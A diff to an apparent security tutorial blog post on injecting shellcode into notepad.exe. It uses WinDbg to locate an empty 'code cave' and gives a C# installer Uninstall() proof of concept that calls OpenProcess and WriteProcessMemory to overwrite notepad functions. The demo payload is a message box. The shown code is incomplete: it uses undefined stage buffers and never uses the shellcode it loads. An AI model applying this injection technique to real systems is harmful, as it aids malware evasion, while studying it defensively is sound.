@@ -159,6 +159,81 @@ From MSDN: "`WriteProcessMemory()` copies the data from the specified buffer in 
 ![memaccess](/images/memaccess.png)
 <p style="text-align: center; font-size: 12px;">Partial list of memory protection constants</p>
 
-According to this documentation, we need to have a handle to the process which has the `PROCESS_VM_WRITE` (`0x20`) and `PROCESS_VM_OPERATION` (`0x8`) flags. When these are bitwise-OR'd together, we get `0x28`, which is what we'll pass to the call to `OpenProcess()` as the `dwDesiredAccess` argument.
+According to this documentation, we need to have a handle to the process which has the `PROCESS_VM_WRITE` (`0x20`) and `PROCESS_VM_OPERATION` (`0x8`) flags. When these are bitwise-OR'd together, we get `0x28`, which is what we'll pass to the call to `OpenProcess()` as the `dwDesiredAccess` parameter.
 
 <hr/>
+
+# Write What Where?
+The plan so far is to call `OpenProcess()` to get a handle to the notepad.exe process, then call `WriteProcessMemory()` to write shellcode somewhere in the RX region described above. But where exactly?
+
+When the compiler builds an .exe, it allocates the memory regions in chunks. This means that most of the time there will be an area at the end of the region that is empty, and is the perfect place to store code without clobbering any existing functions/instructions which may crash the application. This is known as a "code cave".
+
+According to the output of `!address` above, the region we're interested in ends at address `0x7ff7e7f46000`, so let's examine the memory just before the ending address. We can start with `0x800` (`2048`) bytes as a guess:
+
+```
+0:006> db 7ff7`e7f46000-0x800
+00007ff7`e7f45800  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+00007ff7`e7f45810  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+00007ff7`e7f45820  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+00007ff7`e7f45830  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+00007ff7`e7f45840  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+00007ff7`e7f45850  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+00007ff7`e7f45860  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+00007ff7`e7f45870  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+```
+<p style="text-align: center; font-size: 12px;">Displaying the area of memory before the end boundary</p>
+
+Not surprisingly, the last `0x800` bytes in this region are empty, so we could potentially write our shellcode anywhere in this area without clobbering existing code.
+
+Just for demonstration purposes, if we go back even further, we'll run into some of notepad's actual live code, so this is too far back:
+```
+0:006> db 7ff7`e7f46000-0x1000
+00007ff7`e7f45000  4c 8b 84 24 80 00 00 00-4c 8b 8c 24 88 00 00 00  L..$....L..$....
+00007ff7`e7f45010  48 83 c4 68 eb 00 ff e0-cc cc cc cc cc cc cc cc  H..h............
+00007ff7`e7f45020  48 83 ec 28 4d 8b 41 38-48 8b ca 49 8b d1 e8 11  H..(M.A8H..I....
+00007ff7`e7f45030  00 00 00 b8 01 00 00 00-48 83 c4 28 c3 cc cc cc  ........H..(....
+00007ff7`e7f45040  cc cc cc cc 40 53 45 8b-18 48 8b da 41 83 e3 f8  ....@SE..H..A...
+00007ff7`e7f45050  4c 8b c9 41 f6 00 04 4c-8b d1 74 13 41 8b 40 08  L..A...L..t.A.@.
+00007ff7`e7f45060  4d 63 50 04 f7 d8 4c 03-d1 48 63 c8 4c 23 d1 49  McP...L..Hc.L#.I
+00007ff7`e7f45070  63 c3 4a 8b 14 10 48 8b-43 10 8b 48 08 48 8b 43  c.J...H.C..H.H.C
+```
+<p style="text-align: center; font-size: 12px;">Displaying memory containing live code</p>
+
+This is not a problem since 2048 bytes is plenty of space for most shellcode, so we can stick with `0x800`, which is empty.
+
+<hr/>
+
+# PoC #2
+We'll update the `Uninstall()` function to import the required functions and then call them.
+
+```csharp
+public override void Uninstall(IDictionary savedState)
+{
+    // Read in shellcode file from disk
+    byte[] Shellcode = File.ReadAllBytes("c:\\temp\\msgbox.bin");
+
+    // Spawn notepad.exe
+    Process p = new Process();
+    p.StartInfo.FileName = "c:\\windows\\system32\\notepad.exe";
+    p.StartInfo.CreateNoWindow = false;
+    p.Start();
+
+    // Open a handle to the process, request permissions.
+    // (PROCESS_VM_OPERATION | PROCESS_VM_WRITE) == 0x28
+    IntPtr hProcess = OpenProcess(0x28, 0, (uint)p.Id);
+
+    bool ret = false;
+    int lpNumberOfBytesWritten = 0;
+
+    // Stage1: Address of ReplaceSel()
+    IntPtr ReplaceSel = NotepadBase + 0x157a8;
+    ret = WriteProcessMemory(hProcess, ReplaceSel, Stage1, Stage1.Length, out lpNumberOfBytesWritten);
+
+    // Stage2: Address of CheckSave()
+    IntPtr CheckSave = NotepadBase + 0x3690;
+    ret = WriteProcessMemory(hProcess, CheckSave, Stage2, Stage2.Length, out lpNumberOfBytesWritten);
+
+    // Spin here until notepad.exe exits
+    WaitForSingleObject(hProcess, 0xffffffff);
+}
+```
